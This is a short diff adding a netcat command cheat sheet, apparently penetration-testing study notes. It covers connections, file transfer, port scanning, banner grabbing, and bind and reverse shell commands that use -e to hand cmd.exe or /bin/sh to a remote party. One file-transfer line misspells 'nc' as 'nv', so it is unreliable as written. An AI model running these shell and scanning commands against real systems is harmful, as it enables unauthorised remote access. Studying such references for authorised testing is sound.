@@ -1,0 +1,30 @@
+# connect to IP:port
+nc -nv <IP Address> <Port>
+
+# connect to IP:port and send CRLF
+nc -nvC <IP Address> <Port>
+
+# listen on a TCP port
+nc -lvp <port>
+
+# connect and receive a HTTP page
+nc -nv <IP Address> 80
+HEAD / HTTP/1.1
+
+# transfer a file
+nc -lvp 4444 >output.txt			# Receiving end
+nv -nv <IP Address> < input.txt			# Sending end
+
+# set up a netcat bind shell
+nc -lvp 4444 -e cmd.exe				# replace cmd.exe with /bin/sh for linux
+nc -nv <IP Address> 4444			# Connect to the shell
+
+# set up a netcat reverse shell
+nc -lvp 443					# Attacker listening for connections
+nc -nv <IP Address> 443 -e cmd.exe		# replace cmd.exe with /bin/sh for linux
+
+# scan ports
+nc -z <IP Address> <Port Range in abc - xyz format>
+
+# grab banner
+echo "" | nc -nv -w1 <IP Address> <Ports>
